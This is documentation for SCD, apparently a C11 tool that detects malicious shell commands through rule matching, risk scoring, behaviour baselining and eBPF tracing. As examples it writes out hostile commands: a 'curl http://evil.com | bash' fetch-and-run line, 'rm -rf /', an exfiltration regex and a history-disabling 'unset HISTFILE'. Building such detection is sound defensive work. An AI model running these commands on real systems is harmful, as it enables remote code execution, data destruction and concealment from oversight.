# Suspicious Command Detector (SCD) — Detailed Documentation

## 1. What is SCD?

The **Suspicious Command Detector (SCD)** is a lightweight, zero-dependency, high-performance command-line security utility written in C11. 

Its primary purpose is to **analyze shell histories, live command inputs, or kernel execution traces** and instantly identify commands that are potentially dangerous, malicious, or indicative of a system compromise. 

Instead of relying on heavy-weight SIEM (Security Information and Event Management) agents or bloated Python scripts, SCD is designed to be a single, static binary that can be deployed instantly on any POSIX-compliant system without tracking dependencies.

## 2. The Problem It Solves

When an attacker gains shell access to a system (or when an insider acts maliciously), they often use the shell to perform reconnaissance, escalate privileges, exfiltrate data, or establish persistence. Historically, identifying these actions happens *after* the fact during an incident response investigation by manually reading `.bash_history` files.

**SCD automates this analysis.** It acts as an automated threat-hunter that reads commands and compares them against known "bad" patterns (like reverse shells or system destruction) and anomalous user behaviors.

## 3. Core Capabilities

SCD is split into several powerful modules:

### A. Advanced Parsing Engine
SCD doesn't just do simple string matching. It features a custom tokenizer designed to understand subshells, pipelined commands, and logical operators (`&&`, `||`). This ensures that complex commands like `curl http://evil.com | bash` are properly broken down and analyzed without getting confused by quoting or variables.

### B. Rule Engine (Regex & Substring)
SCD ships with an external configuration file (`rules.conf`) that allows security teams to define patterns without recompiling the program. 
- **Substring Matches:** Fast, exact character matching (e.g., `rm -rf /`).
- **POSIX ERE Matches:** Powerful extended regular expressions (e.g., `regex:(^|[[:space:]])curl[[:space:]].*-d[[:space:]]`).

### C. Risk Scoring System
Instead of binary "yes/no" alerting, SCD assigns risk scores out of 100 based on the detected threat level:
- **Low (15 pts):** Anti-forensics (e.g., clearing history).
- **Medium (40 pts):** Persistence (e.g., modifying cron jobs).
- **High (70 pts):** Privilege escalation, remote code execution.
- **Critical (100 pts):** Destructive actions, reverse shells.

### D. User Behavior Baselining (Anomaly Detection)
SCD can "learn" what normal behavior looks like for a user. By running `scd --learn .bash_history`, it builds a statistical frequency dictionary of common command prefixes. Later, when scanning new commands, if an attacker uses commands vastly different from the user's baseline, SCD calculates a mathematical **Anomaly Score**.

### E. Real-Time Alerting (Webhooks & Web UI)
SCD isn't just a local tool; it connects to your existing infrastructure:
- **Webhooks & Slack:** Instantly POST JSON payloads or formatted Slack blocks to your security monitoring channels.
- **Web Dashboard:** A built-in POSIX socket HTTP server serves a beautiful, dark-themed HTML/JS dashboard displaying real-time alerts.

### F. Kernel-level Tracing (eBPF)
Because attackers can easily disable `.bash_history` using `unset HISTFILE`, SCD includes `bpftrace` eBPF scripts that hook directly into the Linux Kernel's `execve` syscall. This allows SCD to sniff commands as they hit the CPU, making it impossible for user-land attackers to hide their tracks.

## 4. Architecture Flow

1. **Input Stage:** Commands are streamed via `stdin`, a file, kernel eBPF pipes, or `inotify` (Daemon mode watching live log files).
2. **Tokenizer:** The raw string is broken into executable tokens.
3. **Whitelist Check:** Is this on the allowed list? If so, drop it.
4. **Pattern Matcher:** The tokens are tested against the loaded `rules.conf`.
5. **Anomaly Engine:** If no rules match, the baseline is checked. Does this look anomalous?
6. **Scorer:** Risk scores are calculated based on matches.
7. **Action Dispatcher:** If the score exceeds the threshold, SCD triggers alerts (Text, JSON, Slack Webhook, Web UI Websocket/Polling).

## 5. Security & Deployment Posture

SCD was designed with security in mind:
- **Zero Allocations in Hot Path:** All scanning uses fixed-size stack buffers. This eliminates memory leak risks, fragmentation, and heap-based buffer overflows during high-throughput scanning.
- **Systemd Hardening:** The provided `scd.service` configuration restricts the daemon from modifying the system, establishing read-only paths and private temp directories.
- **Containerization:** The repository includes a distroless Docker configuration for cloud-native scanning.

## 6. Summary

SCD bridges the gap between simple grep scripts and expensive enterprise EDR (Endpoint Detection and Response) tools. It is the perfect tool for sysadmins, DevOps engineers, and security researchers who need immediate, reliable, and noise-free command investigation capabilities.
